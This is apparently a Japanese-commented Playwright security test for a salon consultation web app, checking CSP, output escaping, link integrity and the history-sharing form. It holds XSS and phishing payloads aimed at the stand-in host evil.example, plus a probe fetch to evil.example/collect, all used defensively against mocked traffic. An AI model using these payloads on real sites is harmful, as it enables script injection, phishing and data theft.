// 画面の表示・リンク・CSP の確認（2026-10 安全点検）
// 実行: npm run build のあと node tests/browser-safety.test.mjs
// 必要: Playwright と Chromium（依存関係には追加していない。無い環境では「未実行」として終了コード2で止まる）
//
// ・dist/ を手元のサーバーで配信し、vercel.json のヘッダー（CSP を含む）をそのまま付ける
// ・/api/gemini と /api/share-history は差し替え、本物の Gemini・Googleフォームには送らない
// ・外部への通信はすべて途中で止めて記録する（フォント・共有フォームを開く操作も外へは出ない）
// 注意: Vercel 本番・プレビュー環境、実機のスマホでの確認の代わりにはならない。

import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { execSync } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const dist = path.join(root, "dist");

const notRun = (why) => { console.log(`未実行: ${why}`); process.exit(2); };
if (!existsSync(path.join(dist, "index.html"))) notRun("dist/ がありません。先に npm run build を実行してください。");

async function loadPlaywright() {
  try { return await import("playwright"); } catch { /* 次を試す */ }
  try {
    const globalRoot = execSync("npm root -g", { encoding: "utf8" }).trim();
    return await import(pathToFileURL(path.join(globalRoot, "playwright", "index.mjs")).href);
  } catch { return null; }
}
const pw = await loadPlaywright();
if (!pw) notRun("Playwright が見つかりません。");

// ── vercel.json のヘッダーを付けて dist/ を配信 ──
const vercel = JSON.parse(await readFile(path.join(root, "vercel.json"), "utf8"));
const headerRules = (vercel.headers || []).map((h) => ({ re: new RegExp(`^${h.source}$`), headers: h.headers }));
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".svg": "image/svg+xml", ".png": "image/png" };
const server = createServer(async (req, res) => {
  const urlPath = decodeURIComponent(new URL(req.url, "http://x").pathname);
  for (const rule of headerRules) if (rule.re.test(urlPath)) for (const { key, value } of rule.headers) res.setHeader(key, value);
  let file = path.join(dist, urlPath === "/" ? "index.html" : urlPath);
  if (!file.startsWith(dist) || !existsSync(file)) file = path.join(dist, "index.html");
  try {
    const body = await readFile(file);
    res.setHeader("content-type", TYPES[path.extname(file)] || "application/octet-stream");
    res.end(body);
  } catch { res.statusCode = 404; res.end(); }
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const origin = `http://127.0.0.1:${server.address().port}`;

const results = [];
const check = (name, ok, detail = "") => results.push(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);

// ── 細工した文字列 ──
const EVIL = [
  `<script>window.__xss="script"</script>`,
  `<img src=x onerror="window.__xss='img'">`,
  `<a href="https://evil.example/login">公式予約はこちら</a>`,
  `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
  `<iframe src="https://evil.example/"></iframe>`,
  `<button onclick="location.href='https://evil.example/'">予約する</button>`,
  `javascript:window.__xss='js'`,
  `https://evil.example/login?next=hotpepper`,
].join("\n");

// 正式な案内リンク（App.jsx の定数）。これ以外の行き先を持つリンクが画面にあれば失敗
const OFFICIAL_LINKS = new Set([
  "https://beauty.hotpepper.jp/slnH000166332/coupon/",
  "tel:0888023370",
  "https://www.instagram.com/dais.kochi/",
  "https://note.com/da_is1119",
  "https://maps.app.goo.gl/tGN2uWxBTaUXydMx8?g_st=ic",
  `${origin}/#homepage`,
  "https://docs.google.com/forms/d/e/1FAIpQLSdxr97reDcABJk6Xfom8MUAYUV09GGhd_i1X7yke3B7SogWoA/viewform?usp=publish-editor",
]);
const SHARE_FORM_BASE = "https://docs.google.com/forms/d/e/1FAIpQLSevLDDVaXd3S0eMHNqL7GTomvm3TY8SwUFQO62WeOgRJd8nJQ/viewform";

const seeded = [1, 2].map((n) => ({
  id: 1700000000000 + n,
  createdAt: "2026-10-01T10:00:00.000Z",
  entryTitle: "初めての方",
  category: "カラー相談",
  group: "頭皮・ケア・デザイン・カラー",
  summary: "s",
  guidance: "g",
  nextAction: "n",
  text: `保存済みの相談${n}\n${EVIL}`,
  aiResponse: `保存済みの返答${n}\n${EVIL}`,
  imageCount: 0,
  attachedUrls: ["https://evil.example/saved"],
  favorite: n === 1,
}));

// 1x1 の PNG（写真表示の確認用）
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

const browser = await pw.chromium.launch();
const context = await browser.newContext();
const external = [];
const apiCalls = [];
let shareFailNext = false;
await context.route("**/*", async (route) => {
  const req = route.request();
  const u = new URL(req.url());
  if (u.origin === origin && u.pathname === "/api/gemini") {
    apiCalls.push({ path: u.pathname, body: req.postData() });
    const text = `ご相談ありがとうございます。\n${EVIL}\n公式の予約はこちら https://evil.example/booking から。`;
    return route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ text: text + "お気軽にどうぞ。", urlStatus: "disabled", imageStatus: "ok" }) });
  }
  if (u.origin === origin && u.pathname === "/api/share-history") {
    apiCalls.push({ path: u.pathname, body: req.postData() });
    if (shareFailNext) {
      // フォーム送信に失敗した場合のサーバー応答を再現（少し遅らせて二重押しの余地を作る）
      await new Promise((r) => setTimeout(r, 300));
      return route.fulfill({ status: 502, contentType: "application/json", body: JSON.stringify({ error: "Form submit failed: 400" }) });
    }
    return route.fulfill({ status: 200, contentType: "application/json", body: "{}" });
  }
  if (u.origin === origin) return route.continue();
  external.push({ host: u.host, type: req.resourceType(), url: req.url() });
  const contentType = req.resourceType() === "stylesheet" ? "text/css" : "text/html";
  return route.fulfill({ status: 200, contentType, body: "" });
});
await context.addInitScript(([key, items]) => {
  if (!sessionStorage.getItem("__seeded")) {
    localStorage.setItem("dpepper_user_type", "first");
    localStorage.setItem(key, JSON.stringify(items));
    sessionStorage.setItem("__seeded", "1");
  }
  window.__csp = [];
  document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.effectiveDirective} ${e.blockedURI}`));
}, ["d-pepper-consultations", seeded]);

const page = await context.newPage();
const dialogs = [];
const popups = [];
const navigations = [];
page.on("dialog", (d) => { dialogs.push(d.message()); d.dismiss(); });
page.on("popup", (p) => popups.push(p));
page.on("framenavigated", (f) => { if (f === page.mainFrame()) navigations.push(f.url()); });

try {
const response = await page.goto(origin + "/");
const csp = response.headers()["content-security-policy"] || "";
check("配信時に CSP ヘッダーが付く（vercel.json と同じ値）", csp.includes("script-src 'self'") && csp.includes("frame-ancestors 'none'"));

const linkCheck = async (where) => {
  const hrefs = await page.$$eval("a[href]", (as) => as.map((a) => a.href));
  const bad = hrefs.filter((h) => !OFFICIAL_LINKS.has(h));
  check(`${where}：画面のリンクは正式な案内だけ`, bad.length === 0, bad.length ? bad.join(", ") : `${hrefs.length} 件`);
};
const injectedCheck = async (where) => {
  const found = await page.evaluate(() => ({
    xss: window.__xss ?? null,
    scripts: [...document.scripts].filter((s) => !s.src).length,
    badImgs: [...document.images].filter((i) => !i.src.startsWith("blob:") && !i.src.startsWith(location.origin)).length,
    frames: document.querySelectorAll("iframe, meta[http-equiv], object, embed").length,
    evilButtons: [...document.querySelectorAll("button[onclick]")].length,
  }));
  check(`${where}：細工した文字列が HTML・スクリプト・偽ボタンにならない`,
    found.xss === null && found.scripts === 0 && found.badImgs === 0 && found.frames === 0 && found.evilButtons === 0, JSON.stringify(found));
};

// ── 1) 相談画面：写真を添付して表示を確認 ──
await page.locator("textarea").fill(`相談です\n${EVIL}`);
await page.locator('input[type="file"]').setInputFiles({ name: "photo.png", mimeType: "image/png", buffer: PNG });
const previewOk = await page.waitForFunction(() => {
  const img = [...document.images].find((i) => i.src.startsWith("blob:"));
  return img && img.complete && img.naturalWidth > 0;
}, null, { timeout: 5000 }).then(() => true, () => false);
check("写真のプレビューが CSP の下で表示される（blob:）", previewOk);

// ── 2) 通常相談 → AI返答（細工した文字列入り）──
await page.getByRole("button", { name: /相談・記録する/ }).click();
await page.getByText("公式の予約はこちら", { exact: false }).waitFor({ timeout: 15000 });
const geminiReq = apiCalls.find((c) => c.path === "/api/gemini");
check("通常相談は自サイトの /api/gemini にだけ送る（差し替え済み）", !!geminiReq);
const aiText = await page.locator("p", { hasText: "公式の予約はこちら" }).first().innerText();
check("AI返答の HTML は文字として表示される", aiText.includes(`<script>window.__xss="script"</script>`) && aiText.includes("<a href="));
const aiLinks = await page.locator("a", { hasText: "evil.example" }).count();
check("AI返答の URL は自動でリンクにならない", aiLinks === 0 && aiText.includes("https://evil.example/booking"));
const exitHrefs = await page.$$eval(".exit-btn-url-row a", (as) => as.map((a) => a.getAttribute("href")));
check("正式な案内ボタンの行き先は入力で変わらない",
  exitHrefs.length > 0 && exitHrefs.every((h) => h === "https://beauty.hotpepper.jp/slnH000166332/coupon/" || h === "tel:0888023370"), exitHrefs.join(", "));
await linkCheck("相談結果");
await injectedCheck("相談結果");

// ── 3) 共有フォームを開く（外へは出さず、行き先と中身だけ確認）──
await page.locator(".share-btn").click();
const [popup] = await Promise.all([page.waitForEvent("popup"), page.locator(".share-confirm-go").click()]);
const popupUrl = popup.url();
await popup.close();
const shareUrl = new URL(popupUrl);
const shareText = shareUrl.searchParams.get("entry.1825538084") || "";
check("共有フォームの行き先は正式なフォームだけ", popupUrl.startsWith(SHARE_FORM_BASE + "?") && shareUrl.host === "docs.google.com");
check("共有フォームへは相談文が文字のまま渡る（行き先は変わらない）",
  shareText.includes(`<img src=x onerror="window.__xss='img'">`) && shareUrl.searchParams.get("usp") === "pp_url");

// ── 4) 保存履歴 ──
await page.locator(".history-button").click();
await page.getByText("保存済みの相談1", { exact: false }).first().waitFor();
await linkCheck("履歴一覧");
await injectedCheck("履歴一覧");
await page.locator("article.history-item", { hasText: "保存済みの相談1" }).click();
await page.locator(".history-detail-text").first().waitFor();
const detail = await page.locator(".history-detail-text").allInnerTexts();
check("履歴詳細の HTML は文字として表示される", detail.some((t) => t.includes("<iframe src=")) && detail.some((t) => t.includes("保存済みの返答1")));
await linkCheck("履歴詳細");
await injectedCheck("履歴詳細");

// 履歴共有（差し替えた /api/share-history へ）
const shareCalls = () => apiCalls.filter((c) => c.path === "/api/share-history");
const goBtn = () => page.locator(".history-detail-share-go");
const emailInput = () => page.locator("#history-share-email");

// 返信希望（初期値）：返信先の入力欄が出て、未入力・不正な形式では送れない
await page.locator(".history-detail-share-btn").click();
check("返信希望では返信先メールアドレスの入力欄が表示される", await emailInput().isVisible());
check("返信希望で未入力のときは「共有する」を押せない", await goBtn().isDisabled());
await emailInput().fill("customer.example.com");
await emailInput().blur();
check("返信希望で不正な形式のときは押せず、形式の確認を案内する",
  await goBtn().isDisabled() && (await page.getByText("メールアドレスの形式を確認してください", { exact: false }).count()) > 0);
const beforeInvalid = shareCalls().length;
await goBtn().evaluate((btn) => btn.click());
check("返信希望で不正な形式のときは送信しない（押せない状態で押しても送らない）", shareCalls().length === beforeInvalid);

// 返信不要：入力欄は出ず、連絡先は送らない
await page.getByRole("button", { name: "返信不要" }).click();
check("返信不要では返信先の入力欄が表示されない", (await emailInput().count()) === 0);
await goBtn().click();
await page.getByText("相談内容をDa-isに共有しました", { exact: false }).waitFor({ timeout: 5000 }).catch(() => {});
const shareReq = shareCalls().at(-1);
const shareBody = shareReq ? JSON.parse(shareReq.body) : {};
check("履歴共有は自サイトの /api/share-history にだけ送る（差し替え済み）", !!shareReq);
check("履歴共有で送る内容は保存されている履歴そのまま", JSON.stringify(shareBody.item) === JSON.stringify(seeded[0]));
check("返信不要では連絡先を送らない（入力途中の値も混入しない）", shareBody.replyRequest === "返信不要" && !("replyEmail" in shareBody));

// 返信希望：正しい返信先を入れて送る
await page.locator(".history-detail-share-again").click();
await page.locator(".history-detail-share-btn").click();
await page.getByRole("button", { name: "返信希望" }).click();
await emailInput().fill("  customer.test@example.com ");
check("返信希望で正しい形式なら「共有する」を押せる", !(await goBtn().isDisabled()));
await goBtn().click();
await page.getByText("相談内容をDa-isに共有しました", { exact: false }).waitFor({ timeout: 5000 }).catch(() => {});
const replyBody = JSON.parse(shareCalls().at(-1)?.body || "{}");
check("返信希望では返信先（前後の空白を除いた値）を送る",
  replyBody.replyRequest === "返信希望" && replyBody.replyEmail === "customer.test@example.com");
check("返信先メールアドレスは端末（localStorage）に保存しない",
  !(await page.evaluate(() => Object.values(localStorage).some((v) => String(v).includes("customer.test@")))));

// 履歴共有が失敗した場合：成功と表示せず、二重押しでも送信は1回
{
  shareFailNext = true;
  const before = shareCalls().length;
  await page.locator(".history-detail-share-again").click();
  await page.locator(".history-detail-share-btn").click();
  await emailInput().fill("customer.test@example.com");
  await goBtn().evaluate((btn) => { btn.click(); btn.click(); });
  await page.getByText("共有に失敗しました", { exact: false }).waitFor({ timeout: 5000 }).catch(() => {});
  const failShown = await page.getByText("共有に失敗しました", { exact: false }).count();
  const okShown = await page.getByText("相談内容をDa-isに共有しました", { exact: false }).count();
  const sentCount = shareCalls().length - before;
  check("履歴共有の失敗時は「失敗しました」と表示し、成功とは表示しない", failShown > 0 && okShown === 0);
  check("「共有する」を素早く2回押しても、送信は1回だけ", sentCount === 1, `送信 ${sentCount} 回`);
  shareFailNext = false;
}

// ── 5) 利用者のデータを勝手に消さない・書き換えない ──
const stored = await page.evaluate(() => JSON.parse(localStorage.getItem("d-pepper-consultations") || "[]"));
const keptAsIs = seeded.every((s) => JSON.stringify(stored.find((x) => x.id === s.id)) === JSON.stringify(s));
check("保存済みの履歴は消えず、内容も変わらない", keptAsIs, `保存件数 ${stored.length}（元 ${seeded.length} ＋ 今回 1）`);
check("今回の相談も履歴に追加される", stored.length === seeded.length + 1);

// ── 6) 自動遷移・勝手な外部通信がない ──
check("ページが勝手に移動しない", navigations.every((u) => u.startsWith(origin)), navigations.join(", "));
check("ダイアログが出ない", dialogs.length === 0, dialogs.join(" / "));
check("新しいウィンドウは利用者が押した共有フォームの1回だけ", popups.length === 1);
const unexpected = external.filter((e) => !(
  (e.host === "fonts.googleapis.com" && e.type === "stylesheet") ||
  (e.host === "docs.google.com" && e.type === "document")
));
check("外部への通信はフォント読み込みと、利用者が開いた共有フォームだけ", unexpected.length === 0,
  [...new Set(external.map((e) => `${e.host}(${e.type})`))].join(", "));
check("evil.example への通信は一度もない", !external.some((e) => e.host.includes("evil.example")));

// トップ画面（Instagram・note・地図・電話などの案内）
await page.keyboard.press("Escape");
await page.goto(origin + "/");
await page.locator(".change-entry-btn").click();
await page.locator(".social-link").first().waitFor();
await linkCheck("トップ画面");

// ── 7) CSP：通常の操作では違反がなく、埋め込まれたスクリプトや外部通信は止まる ──
const normalViolations = await page.evaluate(() => [...window.__csp]);
check("通常の相談・写真・共有・履歴で CSP 違反が出ない", normalViolations.length === 0, normalViolations.join(" / "));
const probe = await page.evaluate(async () => {
  const s = document.createElement("script");
  s.textContent = "window.__inlineRan = true";
  document.body.appendChild(s);
  let fetchBlocked = false;
  try { await fetch("https://evil.example/collect"); } catch { fetchBlocked = true; }
  await new Promise((r) => setTimeout(r, 50));
  return { inlineRan: window.__inlineRan === true, fetchBlocked, violations: [...window.__csp] };
});
check("CSP：後から差し込まれたスクリプトは実行されない", !probe.inlineRan && probe.violations.some((v) => v.startsWith("script-src")));
check("CSP：外部への fetch は遮断される", probe.fetchBlocked && probe.violations.some((v) => v.startsWith("connect-src")) && !external.some((e) => e.url.includes("/collect")));

} catch (e) {
  // 途中で止まった場合（勝手な移動で画面が消えた等）も失敗として記録する
  check("確認が最後まで進む", false, `${e.message.split("\n")[0]} / 移動先: ${navigations.join(", ")}`);
}

await browser.close();
server.close();

console.log(results.join("\n"));
const failed = results.filter((x) => x.startsWith("FAIL")).length;
console.log(`\n合計 ${results.length} 項目 / 失敗 ${failed}`);
process.exit(failed ? 1 : 0);
